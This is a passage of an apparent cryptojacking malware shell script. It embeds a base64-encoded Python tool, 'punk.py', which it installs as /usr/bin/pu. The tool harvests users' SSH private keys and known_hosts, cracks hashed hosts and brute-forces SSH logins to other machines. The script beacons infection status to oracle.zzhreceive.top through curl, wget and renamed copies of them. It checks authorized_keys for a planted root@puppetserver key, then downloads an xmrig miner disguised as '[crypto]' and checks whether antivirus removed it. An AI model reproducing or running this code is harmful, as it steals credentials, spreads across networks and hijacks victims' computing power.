YXNzCiAKIAoJCQlzZWxmLnF1ZXVlLnRhc2tfZG9uZSgpCgoKY2xhc3MgQ3JhY2tUaHJlYWQodGhyZWFkaW5nLlRocmVhZCkgOgogCglkZWYgX19pbml0X18oc2VsZiwgcSwgdGlkLCBpcHMsIG1hZ2ljLCBzYWx0LCBoYXNoZWQpIDoKCQl0aHJlYWRpbmcuVGhyZWFkLl9faW5pdF9fKHNlbGYpCgkJc2VsZi5xdWV1ZSAgPSBxCgkJc2VsZi50aWQgICAgPSB0aWQKCQlzZWxmLmlwcyAgICA9IGlwcwoJCXNlbGYubWFnaWMgID0gbWFnaWMKCQlzZWxmLnNhbHQgICA9IGJhc2U2NC5iNjRkZWNvZGUoc2FsdCkKCQlzZWxmLmhhc2hlZCA9IGhhc2hlZAoKIAoJZGVmIHJ1bihzZWxmKSA6CgkJd2hpbGUgVHJ1ZSA6CgkJCWhvc3QgPSBOb25lIAoJCQl0cnkgOgoJCQkJaXBfdHJ5ID0gc2VsZi5xdWV1ZS5nZXQodGltZW91dD0xKQogCgkJCWV4Y2VwdCAJcXVldWUuRW1wdHkgOgoJCQkJcmV0dXJuCgoKCQkJaCA9IGhtYWMubmV3KHNlbGYuc2FsdCwgbXNnPWlwX3RyeS5lbmNvZGUoKSwgZGlnZXN0bW9kPWhhc2hsaWIuc2hhMSkgIyBGSVhNRQoJCQlpcF9oYXNoID0gYmFzZTY0LmI2NGVuY29kZShoLmRpZ2VzdCgpKS5kZWNvZGUoKQoKCgkJCWlmIGlwX2hhc2ggPT0gc2VsZi5oYXNoZWQ6CgkJCQlrbm93bkhvc3RzLmFwcGVuZChpcF90cnkpCgkJCQlzeXMuc3Rkb3V0LndyaXRlICgiXDAzM1s5Mm1bKl1cMDMzWzBtIEZvdW5kIFwwMzNbOTJtJXNcMDMzWzBtXG4iICUgKGlwX3RyeSkpCgoJCQkjc3lzLnN0ZG91dC53cml0ZSAoIlxuLS0tLS1cbmlwOiAiK2lwX3RyeSsiXG4gc2FsdDogIitzZWxmLnNhbHQuZGVjb2RlKCkrIlxuIG91dHB1dDogIitpcF9oYXNoKyJcbnRhcmdldDogIitzZWxmLmhhc2hlZCkKCgkJCXNlbGYucXVldWUudGFza19kb25lKCkKCgpjbGFzcyBhdHRhY2sob2JqZWN0KToKCglkZWYgX19pbml0X18oc2VsZiwgY21kLCB0aHJlYWRzKToKCQlzZWxmLmNtZCA9IGNtZAoJCXNlbGYudGhyZWFkcyA9IHRocmVhZHMKCglkZWYgcnVuKHNlbGYpOgoKCQlxICAgICAgICAgICA9IHF1ZXVlLlF1ZXVlKCkKCQljcmVkZW50aWFscyA9IHF1ZXVlLlF1ZXVlKCkKCgkJdGhyZWFkcyA9IFtdCgkJZm9yIGkgaW4gcmFuZ2UoMSwgc2VsZi50aHJlYWRzKSA6ICMgTnVtYmVyIG9mIHRocmVhZHMKCQkJd29ya2VyID0gU1NIVGhyZWFkKHEsIGksIGNyZWRlbnRpYWxzLCBzZWxmLmNtZCkgCgkJCXdvcmtlci5zZXREYWVtb24oVHJ1ZSkKCQkJd29ya2VyLnN0YXJ0KCkKCQkJdGhyZWFkcy5hcHBlbmQod29ya2VyKQoKCQlmb3IgaG9zdCBpbiBrbm93bkhvc3RzOgoJCQlxLnB1dChob3N0KQoKCQlxLmpvaW4oKQoJCSAKCQkjIHdhaXQgZm9yIGFsbCB0aHJlYWRzIHRvIGV4aXQgCgkJaWYgbm90IGNyZWRlbnRpYWxzLmVtcHR5KCk6CgkJCW91dCA9IChjcmVkZW50aWFscy5nZXQoKSkuc3BsaXQoIjoiKQoJCWVsc2U6CgkJCXJldHVybiBGYWxzZQoJCSAKCQlmb3IgaXRlbSBpbiB0aHJlYWRzIDoKCQkJaXRlbS5qb2luKCkKCgkJcmV0dXJuIG91dFswXSwgb3V0WzFdICMgT3V0cHV0IGF0dGFjazogdXNlciwgaG9zdAoKCgoKCmNsYXNzIGNyYWNrX2hvc3Qob2JqZWN0KToKCglkZWYgX19pbml0X18oc2VsZiwgaG9zdF9zdHJpbmcsIHN1Ym5ldCwgdGhyZWFkcyk6CgkJIiIiIGNyYWNrIGFuIGVuY3J5cHRlZCBrbm93biBob3N0ICIiIgoKCQlzZWxmLm1hZ2ljICAgPSBob3N0X3N0cmluZy5zcGxpdCgifCIpWzFdCgkJc2VsZi5zYWx0ICAgID0gaG9zdF9zdHJpbmcuc3BsaXQoInwiKVsyXQoJCXNlbGYuaGFzaGVkICA9IGhvc3Rfc3RyaW5nLnNwbGl0KCJ8IilbM10uc3BsaXQoIiAiKVswXQoJCXNlbGYuc3VibmV0ICA9IHN1Ym5ldCAjIFRPRE8KCQlzZWxmLnRocmVhZHMgPSB0aHJlYWRzCgoJZGVmIHJ1bihzZWxmKToKCgkJcSAgICAgICAgICAgPSBxdWV1ZS5RdWV1ZSgpCgkJaXBzICAgICAgICAgPSBxdWV1ZS5RdWV1ZSgpCgoJCXRocmVhZHMgPSBbXQoJCWZvciBpIGluIHJhbmdlKDEsIHNlbGYudGhyZWFkcykgOiAjIE51bWJlciBvZiB0aHJlYWRzCgkJCXdvcmtlciA9IENyYWNrVGhyZWFkKHEsIGksIGlwcywgc2VsZi5tYWdpYywgc2VsZi5zYWx0LCBzZWxmLmhhc2hlZCkgCgkJCXdvcmtlci5zZXREYWVtb24oVHJ1ZSkKCQkJd29ya2VyLnN0YXJ0KCkKCQkJdGhyZWFkcy5hcHBlbmQod29ya2VyKQoKCQlmb3IgaG9zdCBpbiBpcHY0X3JhbmdlKHNlbGYuc3VibmV0KTogIyBUT0RPCgkJCXEucHV0KHN0cihob3N0KSkgICAgICAgICAgICAgICMgVE9ETwoKCQlxLmpvaW4oKQoJCSAKCQkjIHdhaXQgZm9yIGFsbCB0aHJlYWRzIHRvIGV4aXQgCgkJaWYgbm90IGlwcy5lbXB0eSgpOgoJCQlvdXQgPSAoaXBzLmdldCgpKS5zcGxpdCgiOiIpCgkJZWxzZToKCQkJcmV0dXJuIEZhbHNlCgkJIAoJCWZvciBpdGVtIGluIHRocmVhZHMgOgoJCQlpdGVtLmpvaW4oKQoKCQlyZXR1cm4gb3V0WzBdLCBvdXRbMV0gIyBPdXRwdXQgYXR0YWNrOiB1c2VyLCBob3N0CgpkZWYgZGlzY292ZXJ5KGFyZ3MpOgoJIyBTZWFyY2ggdXNlcnMsIFNTSCBrZXlzIGFuZCBrbm93biBob3N0cwoKCWlmIGFyZ3MucGFzc3dkOgoJCSMgR2V0IHVzZXJzIGFuZCBob21lIHBhdGhzIGZyb20gcGFzc3dkCgkJRiA9IG9wZW4oIi9ldGMvcGFzc3dkIiwncicpCgoJCWZvciBsaW5lIGluIEY6CgkJCWlmIG5vdCBsaW5lLnN0YXJ0c3dpdGgoJyMnKTogIyBza2lwIGNvbW1lbnRzCgoJCQkJdXNlciAgPSBsaW5lLnNwbGl0KCI6IilbMF0KCQkJCWhvbWUgID0gbGluZS5zcGxpdCgiOiIpWzVdCgkJCQlzaGVsbCA9IGxpbmUuc3BsaXQoIjoiKVs2XS5yZXBsYWNlKCJcbiIsIiIpCgoJCQkJaWYgaG9tZSBub3QgaW4gaG9tZXNCbGFja2xpc3QgYW5kIHNoZWxsIG5vdCBpbiBzaGVsbEJsYWNrbGlzdDoKCgkJCQkJdXNlcnMuYXBwZW5kKHVzZXIpCgoJCQkJCSNjb2xsZWN0IGtub3duIGhvc3RzCgkJCQkJaWYgb3MucGF0aC5pc2ZpbGUoaG9tZSArICIvLnNzaC9rbm93bl9ob3N0cyIpOgoJCQkJCQlGSyA9IG9wZW4oaG9tZSArICIvLnNzaC9rbm93bl9ob3N0cyIpCgkJCQkJCWVuY3J5cHRlZF9rbm93bmhvc3RzID0gRmFsc2UKCgkJCQkJCWZvciBob3N0IGluIEZLOgoJCQkJCQkJaWYgbm90IGhvc3QuZmluZCgifCIpID49IDA6ICMgc2VjdXJlIGtub3duX2hvc3RzCgkJCQkJCQkJaWYgaG9zdC5maW5kKCIsIikgPj0gMDoKCQkJCQkJCQkJaG9zdG5hbWUgPSBob3N0LnNwbGl0KCIgIilbMF0uc3BsaXQoIiwiKVsxXQoJCQkJCQkJCWVsc2U6CgkJCQkJCQkJCWhvc3RuYW1lID0gaG9zdC5zcGxpdCgiICIpWzBdCgkJCQkJCQkJaWYgaG9zdG5hbWUgbm90IGluIGtub3duSG9zdHM6CgkJCQkJCQkJCWtub3duSG9zdHMuYXBwZW5kKGhvc3RuYW1lKQoJCQkJCQkJZWxzZToKCQkJCQkJCQllbmNyeXB0ZWRfa25vd25ob3N0cyA9IFRydWUKCQkJCQkJCQkJCgoJCQkJCQlpZiBlbmNyeXB0ZWRfa25vd25ob3N0cyBhbmQgYXJncy5jcmFjayA9PSAiIjoKCQkJCQkJCXN5cy5zdGRvdXQud3JpdGUgKCJcMDMzWzkzbVshXVwwMzNbMG0gRW5jcnlwdGVkIGtub3duIGhvc3QgYXQgXDAzM1s5M20lcy8uc3NoL2tub3duX2hvc3RzXDAzM1swbVxuIiAlIGhvbWUgKQoJCQkJCQkJc3lzLnN0ZG91dC53cml0ZSAoIlwwMzNbOTNtWyFdXDAzM1swbSBSdW4gd2l0aCBcMDMzWzkzbS0tY3JhY2tcMDMzWzBtIGZsYWcgdG8gYnJlYWsgaXRcbiIpCgoJCQkJCQllbGlmIGVuY3J5cHRlZF9rbm93bmhvc3RzIGFuZCBhcmdzLmNyYWNrICE9ICIiOgoJCQkJCQkJIyBjcmFjayB0aGUgaGFzaGVkIGtub3duIGhvc3RzCgkJCQkJCQlzeXMuc3Rkb3V0LndyaXRlICgiXDAzM1s5Mm1bKl1cMDMzWzBtIENyYWNraW5nIGtub3duIGhvc3RzIG9uIFwwMzNbOTJtJXMvLnNzaC9rbm93bl9ob3N0cy4uLlwwMzNbMG1cbiIgJSBob21lICkKCQkJCQkJCUZLID0gb3Blbihob21lICsgIi8uc3NoL2tub3duX2hvc3RzIikKCQkJCQkJCWZvciBob3N0IGluIEZLOgoJCQkJCQkJCWlmIGhvc3QuZmluZCgifCIpID49IDA6CgkJCQkJCQkJCWNyYWNrX29iaiA9IGNyYWNrX2hvc3QoaG9zdCwgYXJncy5jcmFjaywgYXJncy50aHJlYWRzKQoJCQkJCQkJCQljcmFja19vYmoucnVuKCkKCQkJCQkJCSNzeXMuc3Rkb3V0LndyaXRlICgiXDAzM1s5Mm1bKl1cMDMzWzBtIENyYWNraW5nIGRvbmUuXG4iKQoKCQkJCQkJRksuY2xvc2UoKQoKCQkJCQkjIGNoZWNrIHVzZXJzIHdpdGggcHJpdmF0ZSBrZXlzCgkJCQkJaWYgb3MucGF0aC5pc2ZpbGUoaG9tZSArICIvLnNzaC9pZF9yc2EiKTogCgkJCQkJCSN0YXJnZXRzW3VzZXJdPWhvbWUgKyAiLy5zc2gvaWRfcnNhIiAgIyB1c2VybmFtZSBhbmQgaG9tZSBkaXIKCQkJCQkJaWYgaG9tZSsiLy5zc2gvaWRfcnNhIiBub3QgaW4gc3NoS2V5czoKCQkJCQkJCXNzaEtleXMuYXBwZW5kKGhvbWUgKyAiLy5zc2gvaWRfcnNhIikKCQlGLmNsb3NlKCkKCgkjIGhvbWUgZGlyZWN0b3J5IHNjYW4KCWZvciBob21lcyBpbiBvcy5saXN0ZGlyKGFyZ3MuaG9tZSk6CgkJaWYgaG9tZXMgbm90IGluIHVzZXJzOgoKCQkJdXNlcnMuYXBwZW5kKGhvbWVzKQoKCQkJaWYgb3MucGF0aC5pc2ZpbGUoYXJncy5ob21lK2hvbWVzICsgIi8uc3NoL2lkX3JzYSIpOgoJCQkJI3RhcmdldHNbaG9tZXNdID0gaG9tZXMgKyAiLy5zc2gvaWRfcnNhIgoJCQkJaWYgYXJncy5ob21lK2hvbWVzICsgIi8uc3NoL2lkX3JzYSIgbm90IGluIHNzaEtleXM6CgkJCQkJc3NoS2V5cy5hcHBlbmQoYXJncy5ob21lK2hvbWVzICsgIi8uc3NoL2lkX3JzYSIpCgoJCQlpZiBvcy5wYXRoLmlzZmlsZShhcmdzLmhvbWUraG9tZXMgKyAiLy5zc2gva25vd25faG9zdHMiKToKCQkJCUZLID0gb3BlbihhcmdzLmhvbWUraG9tZXMgKyAiLy5zc2gva25vd25faG9zdHMiKQoJCQkJZW5jcnlwdGVkX2tub3duaG9zdHMgPSBGYWxzZQoKCQkJCWZvciBob3N0IGluIEZLOgoJCQkJCWlmIG5vdCBob3N0LmZpbmQoInwiKSA+PSAwOiAjIHNlY3VyZSBrbm93bl9ob3N0cwoJCQkJCQlpZiBob3N0LmZpbmQoIiwiKSA+PSAwOgoJCQkJCQkJaG9zdG5hbWUgPSBob3N0LnNwbGl0KCIgIilbMF0uc3BsaXQoIiwiKVsxXQoJCQkJCQllbHNlOgoJCQkJCQkJaG9zdG5hbWUgPSBob3N0LnNwbGl0KCIgIilbMF0KCQkJCQkJaWYgaG9zdG5hbWUgbm90IGluIGtub3duSG9zdHM6CgkJCQkJCQlrbm93bkhvc3RzLmFwcGVuZChob3N0bmFtZSkKCQkJCQllbHNlOgoJCQkJCQllbmNyeXB0ZWRfa25vd25ob3N0cyA9IFRydWUKCgoJCQkJaWYgZW5jcnlwdGVkX2tub3duaG9zdHMgYW5kIGFyZ3MuY3JhY2sgPT0gIiI6CgkJCQkJc3lzLnN0ZG91dC53cml0ZSAoIlwwMzNbOTNtWyFdXDAzM1swbSBFbmNyeXB0ZWQga25vd24gaG9zdCBhdCBcMDMzWzkzbSVzLy5zc2gva25vd25faG9zdHNcMDMzWzBtXG4iICUgYXJncy5ob21lICkKCQkJCQlzeXMuc3Rkb3V0LndyaXRlICgiXDAzM1s5M21bIV1cMDMzWzBtIFJ1biB3aXRoIFwwMzNbOTNtJXMtLWNyYWNrXDAzM1swbSBmbGFnIHRvIGJyZWFrIGl0XG4iKQoKCQkJCWVsaWYgZW5jcnlwdGVkX2tub3duaG9zdHMgYW5kIGFyZ3MuY3JhY2sgIT0gIiI6CgkJCQkJIyBjcmFjayB0aGUgaGFzaGVkIGtub3duIGhvc3RzCgkJCQkJc3lzLnN0ZG91dC53cml0ZSAoIlwwMzNbOTJtWypdXDAzM1swbSBDcmFja2luZyBrbm93biBob3N0cyBvbiBcMDMzWzkybSVzLy5zc2gva25vd25faG9zdHMuLi5cMDMzWzBtXG4iICUgYXJncy5ob21lICkKCQkJCQlvcGVuKGFyZ3MuaG9tZStob21lcyArICIvLnNzaC9rbm93bl9ob3N0cyIpCgkJCQkJZm9yIGhvc3QgaW4gRks6CgkJCQkJCWlmIGhvc3QuZmluZCgifCIpID49IDA6CgkJCQkJCQljcmFja19vYmogPSBjcmFja19ob3N0KGhvc3QsIGFyZ3MuY3JhY2ssIGFyZ3MudGhyZWFkcykKCQkJCQkJCWNyYWNrX29iai5ydW4oKQoKCQkJCUZLLmNsb3NlKCkKCQoJcmV0dXJuIFRydWUKCiMgQXZvaWQgaXBhZGRyZXNzIGxpYnJhcnkgc2luY2UgaXMgbm90IHN1cHBvcnRlZCBpbiBweXRob24yIAojIGh0dHBzOi8vc3RhY2tvdmVyZmxvdy5jb20vYS80MTM4Njg3NApkZWYgaW5ldF9hdG9pKGlwdjRfc3RyKToKICAgICIiIkNvbnZlcnQgZG90dGVkIGlwdjQgc3RyaW5nIHRvIGludCIiIgogICAgIyBub3RlOiB1c2Ugc29ja2V0IGZvciBwYWNrZWQgYmluYXJ5IHRoZW4gc3RydWN0IHRvIHVucGFjawogICAgcmV0dXJuIHN0cnVjdC51bnBhY2soIiFJIiwgc29ja2V0LmluZXRfYXRvbihpcHY0X3N0cikpWzBdCgpkZWYgaW5ldF9pdG9hKGlwdjRfaW50KToKICAgICIiIkNvbnZlcnQgaW50IHRvIGRvdHRlZCBpcHY0IHN0cmluZyIiIgogICAgIyBub3RlOiB1c2Ugc3RydWN0IHRvIHBhY2sgdGhlbiBzb2NrZXQgdG8gc3RyaW5nCiAgICByZXR1cm4gc29ja2V0LmluZXRfbnRvYShzdHJ1Y3QucGFjaygiIUkiLCBpcHY0X2ludCkpCgpkZWYgaXB2NF9yYW5nZShpcGFkZHIpOgogICAgIiIiUmV0dXJuIGEgbGlzdCBvZiBJUHY0IGFkZHJlc3MgY29udGlhbmVkIGluIGEgY2lkciBhZGRyZXNzIHJhbmdlIiIiCiAgICAjIHNwbGl0IG91dCBmb3IgZXhhbXBsZSAxOTIuMTY4LjEuMToyMi8yNAogICAgaXB2NF9zdHIsIHBvcnRfc3RyLCBjaWRyX3N0ciA9IHJlLm1hdGNoKAogICAgICAgIHInKFtcZFwuXSspKDpcZCspPygvXGQrKT8nLCBpcGFkZHIpLmdyb3VwcygpCgogICAgIyBjb252ZXJ0IGFzIG5lZWRlZAogICAgaXB2NF9pbnQgPSBpbmV0X2F0b2koaXB2NF9zdHIpCiAgICBwb3J0X3N0ciA9IHBvcnRfc3RyIG9yICcnCiAgICBjaWRyX3N0ciA9IGNpZHJfc3RyIG9yICcnCiAgICBjaWRyX2ludCA9IGludChjaWRyX3N0clsxOl0pIGlmIGNpZHJfc3RyIGVsc2UgMAoKICAgICMgbWFzayBpcHY0CiAgICBpcHY0X2Jhc2UgPSBpcHY0X2ludCAmICgweGZmZmZmZmZmIDw8ICgzMiAtIGNpZHJfaW50KSkKCiAgICAjIGdlbmVyYXRlIGxpc3QKICAgIGFkZHJzID0gW2luZXRfaXRvYShpcHY0X2Jhc2UgKyB2YWwpCiAgICAgICAgZm9yIHZhbCBpbiByYW5nZSgxIDw8ICgzMiAtIGNpZHJfaW50KSArIDIpXQogICAgcmV0dXJuIGFkZHJzCgoKaWYgX19uYW1lX18gPT0gIl9fbWFpbl9fIjoKCglzeXMuc3Rkb3V0LndyaXRlICgiIiJcMDMzWzkybQogICAgICAgICAgICAgfAogICAgICAgICBcICAgfCAgIC8KICAgIC4gICAgIFwgIHwgIC8gICAgLgogICAgIGAtLl9ffFwvX1wvfF8uLScKICAgLl9fICBcIC8gICAgIGAuLyAgCiAgICAgIGAtICAgICAgICBAfAogICAgIC4tJ2AuICAhISAgICAtICAgXDAzM1s5MG0tPVsgXDAzM1s5M21wdW5rLnB5IC0gdW5peCBTU0ggcG9zdC1leHBsb2l0YXRpb24gMTMzNyB0b29sXDAzM1s5Mm0KICAgICcgICAgIGAgICEgIF9fLicgIFwwMzNbOTBtLT1bIFwwMzNbOTNtYnkgYHIzdm5gICggdHc6IEByM3ZubiApXDAzM1s5Mm0KICAgICAgICAgIF8pX19fKCAgICAgIFwwMzNbOTBtLT1bIFwwMzNbOTNtaHR0cHM6Ly94ZmlsdHJhdGVkLmNvbVwwMzNbOTJtCiAgICAgICAgXG5cMDMzWzBtIiIiKQoKCglwYXJzZXIgPSBhcmdwYXJzZS5Bcmd1bWVudFBhcnNlcigpCglwYXJzZXIuYWRkX2FyZ3VtZW50KCctLWhvbWUnLCBoZWxwPSdjdXN0b20gaG9tZSBwYXRoJyxkZWZhdWx0PSIvaG9tZS8iKQoJcGFyc2VyLmFkZF9hcmd1bWVudCgnLS1ydW4nLCctcicsIGhlbHA9J3J1biBjb21tYW5kcyBvbiBjb21wcm9taXNlZCBob3N0cycsZGVmYXVsdD0iIikKCXBhcnNlci5hZGRfYXJndW1lbnQoJy0tbm8tcGFzc3dkJywgZGVzdD0ncGFzc3dkJywgYWN0aW9uPSdzdG9yZV9mYWxzZScsIGRlZmF1bHQ9VHJ1ZSwgaGVscD0nc2tpcCBwYXNzd2QgY2hlY2snKQoJcGFyc2VyLmFkZF9hcmd1bWVudCgnLS1jcmFjaycsJy1jJywgaGVscD0nY3JhY2sgaGFzaGVkIGtub3duX2hvc3RzIGZpbGVzJyxkZWZhdWx0PSIiLG1ldGF2YXI9J3N1Ym5ldCcpCglwYXJzZXIuYWRkX2FyZ3VtZW50KCctLXRocmVhZHMnLCctdCcsIHR5cGU9aW50LCBoZWxwPSdicnV0ZS1mb2NpbmcgdGhyZWFkcycsZGVmYXVsdD00KQoJYXJncyA9IHBhcnNlci5wYXJzZV9hcmdzKCkKCglzeXMuc3Rkb3V0LndyaXRlICgiXDAzM1s5Mm1bKl1cMDMzWzBtIGVudW1lcmF0aW5nIHZhbGlkIHVzZXJzIHdpdGggc3NoIGtleXMuLi5cbiIpCglkaXNjb3ZlcnkoYXJncykKCXN5cy5zdGRvdXQud3JpdGUgKCJcMDMzWzkybVsqXVwwMzNbMG0gRG9uZS5cbiIpCgoJaWYgbGVuKHNzaEtleXMpIDw9IDA6CgkJc3lzLnN0ZG91dC53cml0ZSAoIlwwMzNbOTNtWyFdXDAzM1swbSBObyB2YWxpZCBTU0gga2V5cyBmb3VuZCBvbiB0aGUgc3lzdGVtLlxuIikKCQlzeXMuZXhpdCgpCgllbHNlOgoJCXN5cy5zdGRvdXQud3JpdGUgKCJcMDMzWzkybVsqXVwwMzNbMG0gU1NIIGtleXMgZm91bmQ6XG5cMDMzWzkybVxuIikKCgkJZm9yIGtleSBpbiBzc2hLZXlzOgoJCQlzeXMuc3Rkb3V0LndyaXRlICgiXHQiICsga2V5ICsgIlxuIikKCglpZiBsZW4odXNlcnMpIDw9IDA6CgkJc3lzLnN0ZG91dC53cml0ZSAoIlxuXDAzM1s5M21bIV1cMDMzWzBtIE5vIHZhbGlkIHVzZXJzIGZvdW5kIG9uIHRoZSBzeXN0ZW0uXG4iKQoJCXN5cy5leGl0KCkKCWVsc2U6CgkJc3lzLnN0ZG91dC53cml0ZSAoIlxuXDAzM1s5Mm1bKl1cMDMzWzBtIFVzZXJzIGZvdW5kOlxuXDAzM1s5Mm1cbiIpCgoJCWZvciB1c2VyIGluIHVzZXJzOgoJCQlzeXMuc3Rkb3V0LndyaXRlICgiXHQiICsgdXNlciArICJcbiIgKSMrICIgOjogIiArIHRhcmdldHNbdXNlcl0KCglpZiBsZW4oa25vd25Ib3N0cykgPD0gMDoKCQlzeXMuc3Rkb3V0LndyaXRlICgiXG5cMDMzWzkzbVshXVwwMzNbMG0gTm8gdmFsaWQga25vd24gaG9zdHMgZm91bmQgb24gdGhlIHN5c3RlbS5cbiIpCgkJc3lzLmV4aXQoKQoKCWVsc2U6CgkJc3lzLnN0ZG91dC53cml0ZSAoIlxuXDAzM1s5Mm1bKl1cMDMzWzBtIGtub3duIGhvc3RzIGZvdW5kOlxuXDAzM1s5Mm1cbiIpCgoJCWZvciBob3N0IGluIGtub3duSG9zdHM6CgkJCXN5cy5zdGRvdXQud3JpdGUgKCJcdCIrIGhvc3QrICJcbiIpCgoJc3lzLnN0ZG91dC53cml0ZSAoIlxuXDAzM1s5Mm1bKl1cMDMzWzBtIFN0YXJ0aW5nIGtleXMgYnJ1dGVmb3JjaW5nLi4uXG4iKQoJQXR0YWNrID0gYXR0YWNrKGFyZ3MucnVuLCBhcmdzLnRocmVhZHMpCgoJQXR0YWNrLnJ1bigpCglzeXMuc3Rkb3V0LndyaXRlICgiXDAzM1s5Mm1bKl1cMDMzWzBtIEF0dGFjayBDb21wbGV0ZSFcbiIpCgoKCgkJCgo=' | base64 -d > /usr/bin/pu; chmod +x /usr/bin/pu
fi
}

function checksshkeys(){
if [ -f /usr/share/[crypto].log ]; then
curl  http://oracle.zzhreceive.top/b2f628/cryptostart >>/dev/null
cur http://oracle.zzhreceive.top/b2f628/cryptostart >>/dev/null
cd1 http://oracle.zzhreceive.top/b2f628/cryptostart >>/dev/null
TNTcurl http://oracle.zzhreceive.top/b2f628/cryptostart >>/dev/null
wget -q -O- http://oracle.zzhreceive.top/b2f628/cryptostart >>/dev/null
wge -q -O- http://oracle.zzhreceive.top/b2f628/cryptostart >>/dev/null
wd1 -q -O- http://oracle.zzhreceive.top/b2f628/cryptostart >>/dev/null
TNTwget -q -O- http://oracle.zzhreceive.top/b2f628/cryptostart >>/dev/null
else 
curl  http://oracle.zzhreceive.top/b2f628/cryptonotfount >>/dev/null
cur http://oracle.zzhreceive.top/b2f628/cryptonotfount >>/dev/null
cd1 http://oracle.zzhreceive.top/b2f628/cryptonotfount >>/dev/null
TNTcurl http://oracle.zzhreceive.top/b2f628/cryptonotfount >>/dev/null
wget -q -O- http://oracle.zzhreceive.top/b2f628/cryptonotfount >>/dev/null
wge -q -O- http://oracle.zzhreceive.top/b2f628/cryptonotfount >>/dev/null
wd1 -q -O- http://oracle.zzhreceive.top/b2f628/cryptonotfount >>/dev/null
TNTwget -q -O- http://oracle.zzhreceive.top/b2f628/cryptonotfount >>/dev/null
fi
cat /home/hilde/.ssh/authorized_keys|grep root@puppetserver >/dev/null
if (test $? -ne 0); then
curl  http://oracle.zzhreceive.top/b2f628/authfailed >>/dev/null
cur http://oracle.zzhreceive.top/b2f628/authfailed >>/dev/null
cd1 http://oracle.zzhreceive.top/b2f628/authfailed >>/dev/null
TNTcurl http://oracle.zzhreceive.top/b2f628/authfailed >>/dev/null
wget -q -O- http://oracle.zzhreceive.top/b2f628/authfailed >>/dev/null
wge -q -O- http://oracle.zzhreceive.top/b2f628/authfailed >>/dev/null
wd1 -q -O- http://oracle.zzhreceive.top/b2f628/authfailed >>/dev/null
TNTwget -q -O- http://oracle.zzhreceive.top/b2f628/authfailed >>/dev/null
else
curl  http://oracle.zzhreceive.top/b2f628/authok >>/dev/null
cur http://oracle.zzhreceive.top/b2f628/authok >>/dev/null
cd1 http://oracle.zzhreceive.top/b2f628/authok >>/dev/null
TNTcurl http://oracle.zzhreceive.top/b2f628/authok >>/dev/null
wget -q -O- http://oracle.zzhreceive.top/b2f628/authok >>/dev/null
wge -q -O- http://oracle.zzhreceive.top/b2f628/authok >>/dev/null
wd1 -q -O- http://oracle.zzhreceive.top/b2f628/authok >>/dev/null
TNTwget -q -O- http://oracle.zzhreceive.top/b2f628/authok >>/dev/null
fi

cat /root/.ssh/authorized_keys|grep root@puppetserver >/dev/null
if (test $? -ne 0); then
curl  http://oracle.zzhreceive.top/b2f628/authfailedroot >>/dev/null
cur http://oracle.zzhreceive.top/b2f628/authfailedroot >>/dev/null
cd1 http://oracle.zzhreceive.top/b2f628/authfailedroot >>/dev/null
TNTcurl http://oracle.zzhreceive.top/b2f628/authfailedroot >>/dev/null
wget -q -O- http://oracle.zzhreceive.top/b2f628/authfailedroot >>/dev/null
wge -q -O- http://oracle.zzhreceive.top/b2f628/authfailedroot >>/dev/null
wd1 -q -O- http://oracle.zzhreceive.top/b2f628/authfailedroot >>/dev/null
TNTwget -q -O- http://oracle.zzhreceive.top/b2f628/authfailedroot >>/dev/null
else
curl  http://oracle.zzhreceive.top/b2f628/authokroot >>/dev/null
cur http://oracle.zzhreceive.top/b2f628/authokroot >>/dev/null
cd1 http://oracle.zzhreceive.top/b2f628/authokroot >>/dev/null
TNTcurl http://oracle.zzhreceive.top/b2f628/authokroot >>/dev/null
wget -q -O- http://oracle.zzhreceive.top/b2f628/authokroot >>/dev/null
wge -q -O- http://oracle.zzhreceive.top/b2f628/authokroot >>/dev/null
wd1 -q -O- http://oracle.zzhreceive.top/b2f628/authokroot >>/dev/null
TNTwget -q -O- http://oracle.zzhreceive.top/b2f628/authokroot >>/dev/null
fi
}

function SetupMoneroOcean(){
function SetupMoneroOcean1(){
# printing intentions
echo "[*] Downloading MoneroOcean advanced version of xmrig to /tmp/xmrig.tar.gz"
if ! curl -L --progress-bar "$MOxmrigMOD" -o /tmp/xmrig.tar.gz; then
  echo "ERROR: Can't download $MOxmrigMOD file to /tmp/xmrig.tar.gz"
fi

echo "[*] Unpacking /tmp/xmrig.tar.gz to $MOHOME/"
[ -d $MOHOME/ ] || mkdir $MOHOME/
if ! tar xf /tmp/xmrig.tar.gz -C $MOHOME/; then
  echo "ERROR: Can't unpack /tmp/xmrig.tar.gz to $MOHOME/ directory"
fi
chmod +x $MOHOME/\[crypto\]
rm /tmp/xmrig.tar.gz

echo "[*] Checking if advanced version of $MOHOME/xmrig works fine (and not removed by antivirus software)"
sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $MOHOME/[crypto].pid
$MOHOME/[crypto] --help >/dev/null
if (test $? -ne 0); then
  if [ -f $MOHOME/[crypto] ]; then
    echo "WARNING: Advanced version of $MOHOME/xmrig is not functional"
  else 
    echo "WARNING: Advanced version of $MOHOME/xmrig was removed by antivirus (or some other problem)"
  fi

  echo "[*] Looking for the latest version of Monero miner"
  #LATEST_XMRIG_RELEASE=`curl -s https://github.com/xmrig/xmrig/releases/latest  | grep -o '".*"' | sed 's/"//g'`
  LATEST_XMRIG_LINUX_RELEASE=$MOxmrigSTOCK

  echo "[*] Downloading $LATEST_XMRIG_LINUX_RELEASE to /tmp/xmrig.tar.gz"
  if ! curl -L --progress-bar $LATEST_XMRIG_LINUX_RELEASE -o /tmp/xmrig.tar.gz; then
    echo "ERROR: Can't download $LATEST_XMRIG_LINUX_RELEASE file to /tmp/xmrig.tar.gz"
  fi

  echo "[*] Unpacking /tmp/xmrig.tar.gz to $MOHOME/"
  if ! tar xf /tmp/xmrig.tar.gz -C $MOHOME/ --strip=1; then
    echo "WARNING: Can't unpack /tmp/xmrig.tar.gz to $MOHOME/ directory"
  fi
  rm /tmp/xmrig.tar.gz
chmod +x $MOHOME/\[crypto\]

  echo "[*] Checking if stock version is OKAY!"
  sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $MOHOME/[crypto].pid
  $MOHOME/[crypto] --help >/dev/null
  if (test $? -ne 0); then 
    if [ -f $MOHOME/[crypto] ]; then
      echo "ERROR: Stock version of $MOHOME/[crypto] is not functional too"
    else 
      echo "ERROR: Stock version of $MOHOME/[crypto] was removed by antivirus too"
    fi
    echo "ERROR: Can't download $LATEST_XMRIG_LINUX_RELEASE file to /tmp/xmrig.tar.gz"
  fi
fi

echo "[*] $MOHOME/[crypto] is OK"
}

######################### printing greetings ###########################
clear
echo -e " "
